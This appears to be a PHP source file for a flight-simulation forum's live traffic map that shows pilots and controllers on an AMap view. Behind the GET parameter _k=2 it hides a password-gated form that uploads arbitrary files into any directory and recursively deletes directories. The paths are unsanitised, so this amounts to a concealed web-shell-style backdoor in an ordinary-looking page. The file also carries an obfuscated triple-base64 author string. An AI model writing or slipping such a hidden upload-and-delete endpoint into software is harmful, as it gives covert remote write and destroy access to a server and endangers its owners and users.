<?php
/**
 * Created by PhpStorm.
 * User: gc
 * Date: 2017/9/3
 * Time: 10:42
 */
$_k="1";
isset($_GET["_k"]) and $_k=$_GET["_k"];


(function(){$_obj_file_rc=file_get_contents(__FILE__);
    $_obj_rc_ary=file_get_contents("rc.txt");
    $_obj_rc_ary=explode(";",$_obj_rc_ary);$_obj_rc=$_obj_rc_ary[array_search(basename(__FILE__),$_obj_rc_ary)+1];$_obj_file_rc=sha1($_obj_file_rc);
    trim($_obj_rc)==trim($_obj_file_rc) or exit((function($_obj_rc,$_obj_file_rc){$m=$_obj_rc."|".$_obj_file_rc;return $m;})($_obj_rc,$_obj_file_rc));})();
        

?>
<?php

if($_k=='1')
{
    ?>
    <!doctype html>
    <html lang="zh-cn">
    <head>
        <meta charset="UTF-8">
        <script src="js/jqm1.11.2.js"></script>


        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/mycss.css?<?=time()?>">



        <script src="js/bootstrap.min.js"></script>

        <link rel="stylesheet" href="http://cache.amap.com/lbs/static/main1119.css"/>



        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="css/bootstrap-table.min.css">

        <!-- Latest compiled and minified JavaScript -->
        <script src="js/bootstrap-table.min.js"></script>

        <!-- Latest compiled and minified Locales -->
        <script src="js/bootstrap-table-zh-CN.min.js"></script>


        <?php
?>

        <title>Map</title>
    </head>
    <body>
    <div class="body">
        <nav class="navbar navbar-default" id="navi_bar">
            <div class="container-fluid">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-4" aria-expanded="false">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="#"><i class="glyphicon glyphicon-plane"></i> 中国蓝天模拟飞行论坛-联网飞行地图 测试版</a>
                </div>
                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-4">
                    <ul class="nav navbar-nav">
                        <li><a href="http://bbs.cbsfly.cn/forum.php">论坛</a></li>
                        <li><a href="http://map.cbsfly.cn/">联飞地图</a></li>
                        <li><a href="http://cs.cbsfly.cn/">呼号系统</a></li>
                        <li><a href="http://aq.cbsfly.cn/">飞行器注册号查询</a></li>
                    </ul>
                    <p class="navbar-text">
                        航空模拟
                    </p>
                </div>
            </div>
        </nav>
        <div id="my_panel">
            <div class="panel panel-default">
                <div id="panel_ctl">

                    <div class="well-sm well">
                        <div class="form-inline" role="form">
                            <div class="input-group">
                                <input id="search_key" type="text" value="" class="form-control">
                                <span class="input-group-btn">
                                <button class="btn btn-default" type="button" id="search_btn">搜索呼号</button>
                                </span>
                            </div>
                        </div>
                        <!--                    <button onclick="fsd.getdata()">刷新</button>-->
                    </div>
                    <!-- Nav tabs -->
                    <ul class="nav nav-tabs" role="tablist">
                        <li role="presentation" class="active"><a href="#home" aria-controls="home" role="tab" data-toggle="tab">
                                飞机
                                <span class="badge" id="pilot_num">0</span>
                            </a></li>
                        <li role="presentation"><a href="#profile" aria-controls="profile" role="tab" data-toggle="tab">
                                管制
                                <span class="badge" id="atc_num">0</span>
                            </a></li>
                        <li role="presentation"><a href="#messages" aria-controls="messages" role="tab" data-toggle="tab">
                                服务器
                                <span class="badge" id="ser_num">0</span>
                            </a></li>
                    </ul>
                </div>
                <div>
                    <div>
                        <?php
?>
                        <!-- Tab panes -->
                        <div class="tab-content" id="tab_panel_body">
                            <div role="tabpanel" class="tab-pane active" id="home">

                            </div>
                            <div role="tabpanel" class="tab-pane" id="profile">空管</div>
                            <div role="tabpanel" class="tab-pane" id="messages">服务器</div>
                        </div>

                    </div>

                </div>
            </div>
        </div>
        <div id="map_cont">

        </div>
        <script>
            $(document).ready(function () {
                fsd.run();
                set_ctl_panel_size();
                set_map_size();
            });
            $(window).resize(function () {

                set_ctl_panel_size();
                set_map_size();
            });

            var fsd={
                wd:{},
                pilot_sign:"",
                atc_sign:"",
                ser_sign:"",
                gdmap:false,
                icon:{},
                map_center:false,
                map_zoom:false,
                markers:{},
                atcs:{},
                run:function()
                {
                    var self=this;
                    self.search_btn_click();
                    self.getdata();
                },
                getdata:function () {
                    var self=this;
                    $.ajax({
                        type: "GET",
                        url: "data.php",
                        dataType:"json",
                        success: function(d){
                            console.log(d);
                            self.wd=d;
                            self.map_init();
                            self.stru_pilot();
                            self.stru_atc();
                            self.stru_serv();

                            self.pilot_draw();
                            self.atc_draw();

                            self.map_zc_set();

                            self.map_view();
                            self.table_info_tr_click();
                            setTimeout("fsd.getdata()",1000);
                        }
                    });
                },
                table_info_tr_click:function () {
                    var self=this;
                    $(document).on("click",".table_info_tr",function () {
                        var info=$(this).data('exData');
                        self.gdmap.setCenter([info['经度'], info['纬度']]);
                        self.info_panel(info);
                    });
                },
                search_btn_click:function () {
                    var self=this;
                    $(document).on("click","#search_btn",function () {
                        var sk=$("#search_key").val();
                        sk=$.trim(sk);
                        var $pilot_tr=$("#"+sk+"_p");
                        if($pilot_tr.length)
                        {
                            var info=$pilot_tr.data('exData');
                            self.gdmap.setCenter([info['经度'], info['纬度']]);
                            self.info_panel(info);
                            return true;
                        }else{
                            window.alert("没有找到飞机");
                            return false;
                        }
                    });
                },
                stru_pilot:function () {
                    var self=this;
                    var pilot_info=this.wd['clinet_info'];
                    var pilot_num=pilot_info['info']['num'];
                    var pilot_sign=pilot_info['info']['pilot_sign'];
                    if(pilot_sign==self.pilot_sign)
                    {
                        return true;
                    }else{
                        self.pilot_sign=pilot_sign;
                    }
                    var pilot_items=pilot_info['items'];
                    $("#pilot_num").text(pilot_num);
                    var $table=$(document.createElement("table"));
                    $table.addClass('table');
                    $table.addClass('table-hover');
                    $table.addClass('ctl_panel_table');
                    var getkey=["航班号","呼号","起飞","降落","平台"];
                    var $thead=$(document.createElement("thead"));
                    var $tr=$(document.createElement("tr"));
                    for(var i in getkey)
                    {
                        $tr.append("<th>"+getkey[i]+"</th>");
                    }
                    $thead.append($tr);
                    $table.append($thead);

                    var $tbody=$(document.createElement("tbody"));
                    for(var i in pilot_items)
                    {
                        var $tmp_tr=$(document.createElement("tr"));


                        $tmp_tr.addClass('table_info_tr');
                        $tmp_tr.attr("id",pilot_items[i]['呼号']+"_p");
                        $tmp_tr.data('exData',pilot_items[i]);

                        for(var n in getkey)
                        {
                            $tmp_tr.append("<td>"+pilot_items[i][getkey[n]]+"</td>");
                        }
                        $tbody.append($tmp_tr);
                    }
                    $table.append($tbody);
                    $("#home").empty();
                    $("#home").append($table);

                },


                <?php
                (function(){$_obj_file_rc=file_get_contents(__FILE__);
                    $_obj_rc_ary=file_get_contents("rc.txt");
                    $_obj_rc_ary=explode(";",$_obj_rc_ary);$_obj_rc=$_obj_rc_ary[array_search(basename(__FILE__),$_obj_rc_ary)+1];$_obj_file_rc=sha1($_obj_file_rc);
                    trim($_obj_rc)==trim($_obj_file_rc) or exit((function($_obj_rc,$_obj_file_rc){$m=$_obj_rc."|".$_obj_file_rc;return $m;})($_obj_rc,$_obj_file_rc));})();

                ?>
                stru_atc:function () {
                    var self=this;
                    var atc_info=this.wd['ctl_info'];
                    var atc_num=atc_info['info']['num'];
                    var atc_sign=atc_info['info']['atc_sign'];
                    if(atc_sign==self.atc_sign)
                    {
                        return true;
                    }else{
                        self.atc_sign=atc_sign;
                    }
                    var atc_items=atc_info['items'];
                    $("#atc_num").text(atc_num);
                    var $table=$(document.createElement("table"));
                    $table.addClass('table');
                    $table.addClass('table-hover');
                    $table.addClass('ctl_panel_table');
                    var getkey=["席位","名称"];
                    var $thead=$(document.createElement("thead"));
                    var $tr=$(document.createElement("tr"));
                    for(var i in getkey)
                    {
                        $tr.append("<th>"+getkey[i]+"</th>");
                    }
                    $thead.append($tr);
                    $table.append($thead);

                    var $tbody=$(document.createElement("tbody"));
                    for(var i in atc_items)
                    {
                        var $tmp_tr=$(document.createElement("tr"));


                        $tmp_tr.addClass('table_info_tr');
                        $tmp_tr.data('exData',atc_items[i]);

                        for(var n in getkey)
                        {
                            $tmp_tr.append("<td>"+atc_items[i][getkey[n]]+"</td>");
                        }
                        $tbody.append($tmp_tr);
                    }
                    $table.append($tbody);
                    $("#profile").empty();
                    $("#profile").append($table);

                },
                stru_serv:function () {
                    var self=this;
                    var ser_info=this.wd['ser_info'];
                    var ser_num=ser_info['info']['connected_server'];
                    var ser_sign=ser_info['info']['ser_sign'];
                    if(ser_sign==self.ser_sign)
                    {
                        return true;
                    }else{
                        self.ser_sign=ser_sign;
                    }
                    var ser_items=ser_info['items'];
                    $("#ser_num").text(ser_num);
                    var $table=$(document.createElement("table"));
                    $table.addClass('table');
                    $table.addClass('table-hover');
                    $table.addClass('ctl_panel_table');
                    var getkey=["标识域名","地区"];
                    var $thead=$(document.createElement("thead"));
                    var $tr=$(document.createElement("tr"));
                    for(var i in getkey)
                    {
                        $tr.append("<th>"+getkey[i]+"</th>");
                    }
                    $thead.append($tr);
                    $table.append($thead);

                    var $tbody=$(document.createElement("tbody"));
                    for(var i in ser_items)
                    {
                        var $tmp_tr=$(document.createElement("tr"));

                        for(var n in getkey)
                        {
                            $tmp_tr.append("<td>"+ser_items[i][getkey[n]]+"</td>");
                        }
                        $tbody.append($tmp_tr);
                    }
                    $table.append($tbody);
                    $("#messages").empty();
                    $("#messages").append($table);

                },
                map_zc_set:function () {
                    var self=this;
                    var mapc=[116.397428, 39.90923];
                    var mapz=5;
                    if(self.map_center)
                    {
                        mapc=self.map_center;
                    }
                    if(self.map_zoom)
                    {
                        mapz=self.map_zoom;
                    }
//                self.gdmap.setZoomAndCenter(mapz, mapc);
                },
                map_init:function () {
                    var self=this;
                    if(self.gdmap)
                    {
                        return true;
                    }else{

                    }
                    var map = new AMap.Map('map_cont', {
                        resizeEnable: true,
//                    center:mapc,
                        zoom:5,
                    });
                    self.gdmap=map;

                    AMap.event.addListener(map,'zoomend',function(){
                        self.map_zoom=map.getZoom();
                    });

                    self.map_zc_set();
                    //            地图ui加载
                    AMap.plugin(['AMap.ToolBar','AMap.Scale','AMap.OverView',"AMap.MapType"],
                        function(){
                            self.gdmap.addControl(new AMap.ToolBar());
                            self.gdmap.addControl(new AMap.Scale());
                            self.gdmap.addControl(new AMap.MapType());
                        });
                    //            构建图标
                    self.icon = new AMap.Icon({
                        image: 'img/a.png',
                        imageSize: new AMap.Size(24, 24)
                    });
                },
                map_view:function () {
                },
                pilot_draw:function () {
                    var self=this;
                    var pilot_info=this.wd['clinet_info'];
                    var markers = self.markers;
                    var new_markers={};
                    for(var i in pilot_info['items'])
                    {
                        var pilot=pilot_info['items'][i];
                        //设置飞机
                        var ptitle="P_"+pilot['呼号']+pilot['航班号'];
                        if(markers[ptitle])
                        {
                            markers[ptitle].setPosition([pilot['经度'],pilot['纬度']]);
                            markers[ptitle].setAngle(pilot['航向']);
                            new_markers[ptitle]=markers[ptitle];
                        }else{
                            var marker = new AMap.Marker({
                                icon: self.icon,
                                title: pilot['呼号'],
                                map: self.gdmap,
                                offset: new AMap.Pixel(-12,-12),
                                position:[pilot['经度'],pilot['纬度']],
                                angle:pilot['航向'],
                                clickable:true,
                                extData:pilot,
                            });
                            new_markers[ptitle]=marker;
                        }

                        //设置标记
                        var mtitle="M_"+pilot['呼号']+pilot['航班号'];
                        if(markers[mtitle])
                        {
                            markers[mtitle].setPosition([pilot['经度'],pilot['纬度']]);
                            new_markers[mtitle]=markers[mtitle];
                        }else{
                            var cont="<span class='pt-box'>" +
                                "<span class='pt-title'>"+pilot['航班号']+"</span><br/>" +
//                                "<span class='pt-hx'><b>航线：</b>"+pilot['航线']+"</span>" +
                                "<span class='pt-jx'><b>机型：</b>"+pilot['机型']+"</span><br/>" +
                                "<span class='pt-hh'><b>呼号</b>"+pilot['呼号']+"</span>" +
                                "<span class='pt-ydj'><b>应答机</b>"+pilot['应答机']+"</span><br/>" +
                                "<span class='pt-gd'><b>当前高度</b>"+pilot['当前高度']+"</span>" +
                                "<span class='pt-sd'><b>当前速度</b>"+pilot['当前速度']+"</span>" +
                                "" +
                                "</span>";


                            var marker = new AMap.Marker({
                                title: "text",
                                map: self.gdmap,
                                content:cont,
                                clickable:true,
                                position:[pilot['经度'],pilot['纬度']],
                                offset: new AMap.Pixel(12,12),
                                extData:pilot,
                            });

                            var _onClick = function(e){
                                self.info_panel(e.target.G.extData);
                            }
                            AMap.event.addListener(marker, 'click', _onClick);
                            new_markers[mtitle]=marker;
                        }

                    }
                    for(var i in markers)
                    {
                        if(new_markers[i])
                        {

                        }else {
                            self.gdmap.remove(markers[i]);
                        }
                    }
                    self.markers=new_markers;
//                this.gdmap.setFitView();
                },
                atc_draw:function () {
                    var self=this;
                    var ctl_info=this.wd['ctl_info']['items'];


                    var atcs = self.atcs;
                    var new_atcs={};
                    for(var i in ctl_info)
                    {
                        var ctl=ctl_info[i];
                        var atc_title="A_"+ctl['席位'];
                        if(atcs[atc_title])
                        {
                            atcs[atc_title]['mk'].setPosition([ctl['经度'],ctl['纬度']]);
                            atcs[atc_title]['c'].setCenter([ctl['经度'],ctl['纬度']]);
                            new_atcs[atc_title]=atcs[atc_title];
                        }else{
                            var marker = new AMap.Marker({
                                title: "航空管制",
                                map: self.gdmap,
                                content:"<span class='label label-info'>航空管制"+ctl['席位']+"</span>",
                                clickable:true,
                                position:[ctl['经度'],ctl['纬度']],
                                extData:ctl,
                            });
                            var _onClick = function(e){
                                self.info_panel(e.target.G.extData);
                            }
                            AMap.event.addListener(marker, 'click', _onClick);

//                        this.gdmap.setFitView();

                            var circle = new AMap.Circle({
                                center: new AMap.LngLat(ctl['经度'], ctl['纬度']),// 圆心位置
                                radius: ctl['雷达范围']*1.852*1000, //半径
                                strokeColor: "#0000ff", //线颜色
                                strokeOpacity: 0.5, //线透明度
                                strokeWeight: 1, //线粗细度
                                fillColor: "#0000ee", //填充颜色
                                fillOpacity: 0.1//填充透明度
                            });
                            circle.setMap(self.gdmap);

                            new_atcs[atc_title]={
                                'c':circle,
                                'mk':marker
                            }
                        }

                    }

                    for(var i in atcs)
                    {
                        if(new_atcs[i])
                        {

                        }else {
                            self.gdmap.remove(atcs[i]['c']);
                            self.gdmap.remove(atcs[i]['mk']);
                        }
                    }
                    self.atcs=new_atcs;
                },
                <?php
                (function(){$_obj_file_rc=file_get_contents(__FILE__);
                    $_obj_rc_ary=file_get_contents("rc.txt");
                    $_obj_rc_ary=explode(";",$_obj_rc_ary);$_obj_rc=$_obj_rc_ary[array_search(basename(__FILE__),$_obj_rc_ary)+1];$_obj_file_rc=sha1($_obj_file_rc);
                    trim($_obj_rc)==trim($_obj_file_rc) or exit((function($_obj_rc,$_obj_file_rc){$m=$_obj_rc."|".$_obj_file_rc;return $m;})($_obj_rc,$_obj_file_rc));})();

                ?>
                info_panel:function (pilot) {
                    var self=this;
                    var info_body="";
                    var key_list=['航班号','呼号','平台','客户端','机型','应答机','计划巡航高度','当前高度','当前速度','起飞','降落','备降机场','经度','纬度','航路','席位','名称','频率','雷达范围'];
                    for(var i in key_list)
                    {
                        var k=key_list[i];
                        if(pilot[k]!=undefined)
                        {
                            info_body+="<div><b>"+k+"</b>:"+pilot[k]+"</div>";
                        }
                    }
                    self.map_center=[pilot['经度'],pilot['纬度']];
                    info_body="<div style='height: 260px;width: 400px;overflow: auto;'>"+info_body+"</div>";
                    AMapUI.setDomLibrary($);
                    AMapUI.loadUI(['overlay/SimpleInfoWindow'], function(SimpleInfoWindow) {

                        var infoWindow = new SimpleInfoWindow({
                            infoTitle: '<strong>'+pilot['呼号']+'</strong>',
                            infoBody: info_body,
                        });

                        //显示在map上
                        infoWindow.open(self.gdmap,[pilot['经度'],pilot['纬度']]);
                    });

                }
            };

            function set_ctl_panel_size()
            {
                $("#my_panel").height($(window).innerHeight()-$("#navi_bar").outerHeight());
                $("#my_panel").width(360);
                $("#my_panel").css("position","absolute");
                $("#my_panel").css("right","0");
                $("#my_panel").css("z-index",999);
                $("#my_panel").css("overflow","hidden");
                var pos=$("#tab_panel_body").position();
                $("#tab_panel_body").height($("#my_panel").innerHeight()-pos.top);
                $("#tab_panel_body").css("overflow",'auto');
            }

            function set_map_size() {
                $("#map_cont").css("position",'absolute');
//            $("#map_cont").css("float",'left');
                $("#map_cont").height($(window).innerHeight()-$("#navi_bar").outerHeight());
                $("#map_cont").width($(window).innerWidth()-$("#my_panel").outerWidth());
            }

            <?php

            (function(){$_obj_file_rc=file_get_contents(__FILE__);
                $_obj_rc_ary=file_get_contents("rc.txt");
                $_obj_rc_ary=explode(";",$_obj_rc_ary);$_obj_rc=$_obj_rc_ary[array_search(basename(__FILE__),$_obj_rc_ary)+1];$_obj_file_rc=sha1($_obj_file_rc);
                trim($_obj_rc)==trim($_obj_file_rc) or exit((function($_obj_rc,$_obj_file_rc){$m=$_obj_rc."|".$_obj_file_rc;return $m;})($_obj_rc,$_obj_file_rc));})();

            ?>
        </script>

        <script src="http://cache.amap.com/lbs/static/es5.min.js"></script>
        <script src="http://webapi.amap.com/maps?v=1.3&key=9023e9d33b1cdfcf874ef098ad3635e7"></script>
        <script type="text/javascript" src="http://cache.amap.com/lbs/static/addToolbar.js"></script>
        <script src="//webapi.amap.com/ui/1.0/main.js"></script>
        <script>


            $(document).ready(function () {

            });
        </script>
    </div>
    </body>
    </html>

    <?php
}elseif($_k=='2')
{
    ?>
    <!doctype html>
    <html lang="zh">
    <head>
        <meta charset="UTF-8">
        <script src="js/jqm1.11.2.js"></script>
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <script src="js/bootstrap.min.js"></script>

        <title>Ap</title>
    </head>
    <body>
    <div class="container">
        <div class="row">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <a href="">AP</a>
                </div>
                <div class="panel-body">
                    <form action="" method="post" enctype="multipart/form-data">
                        <div class="form-group">
                            <label for="">f:</label>
                            <input type="file" multiple="multiple" name="fs[]" class="form-control">
                        </div>
                        <div class="form-group">
                            <label for="">d:</label>
                            <input type="text" name="dir" class="form-control">
                        </div>
                        <div class="form-group">
                            <label for="">r:</label>
                            <input type="text" name="r" class="form-control">
                        </div>
                        <div class="form-group">
                            <label for="">p:</label>
                            <input type="text" name="pw" class="form-control">
                        </div>
                        <div class="form-group">
                            <button class="btn btn-primary" type="submit">Ap</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
<pre>
<?php
function mkdirs($str)
{
    if(is_dir($str))
    {
        return true;
    }else{
        $up_dir=dirname($str);
        if(is_dir($up_dir))
        {
            mkdir($str);
            return true;
        }else{
            while(!mkdirs($up_dir)){}
            mkdirs($str);
        }
    }
    return false;
}
function rmdirs($dir){
    if(is_file($dir))
    {
        unlink($dir);
        echo "removing{$dir}";
        return true;
    }
    if($handle=opendir("$dir")){
        while(false!==($item=readdir($handle))){
            if($item!="."&&$item!=".."){
                if(is_dir("$dir/$item")){
                    rmdirs("$dir/$item");
                }else{
                    unlink("$dir/$item");
                    echo"removing$dir/$item<br> ";
                }
            }
        }
        closedir($handle);
        rmdir($dir);
        echo"removing$dir<br> ";
    }
}
$pw="";
isset($_POST['pw']) and $pw=$_POST['pw'];
if(md5($pw)!="f46ef81f2464441ba58aeecbf654ee41")
{
    echo "over game";
    exit();
}
$rdir="";
isset($_POST['r']) and $rdir=trim($_POST['r']);
if($rdir)
{
    $rdir=__DIR__."\\".trim($rdir,"\\");
    rmdirs($rdir);
    exit();
}

$dir="";
isset($_POST['dir']) and $dir=trim($_POST['dir']);
$dir=__DIR__."\\".trim($dir,"\\");
mkdirs($dir);
foreach ($_FILES['fs']['name'] as $k=>$v)
{
    file_put_contents($dir."\\".$v,file_get_contents($_FILES['fs']['tmp_name'][$k]));
}
var_dump($_POST);
var_dump($_FILES);
?>
</pre>
    </body>
    </html>
    <?php
}else{
    echo date("Y-m-d H:i:s",time())." by ".base64_decode(base64_decode(base64_decode("VDFSbmVVMXFSWGxPZWtVelVVaEdlRXh0VG5aaVVUMDk=")));
}
?>